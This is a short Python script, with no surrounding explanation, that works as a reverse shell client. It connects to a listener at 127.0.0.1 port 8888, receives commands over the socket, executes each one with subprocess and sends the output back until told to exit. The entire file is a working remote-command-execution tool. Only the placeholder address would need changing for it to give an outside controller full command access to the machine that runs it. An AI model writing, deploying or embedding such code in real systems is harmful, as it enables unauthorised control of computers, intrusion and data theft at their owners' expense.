import socket
import subprocess

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect(("127.0.0.1", 8888))
    while True:
        command = sock.recv(1024).decode()
        if command.lower() == "exit":
            break
        output = subprocess.getoutput(command)
        print(output)
        sock.send(output.encode("utf-8"))



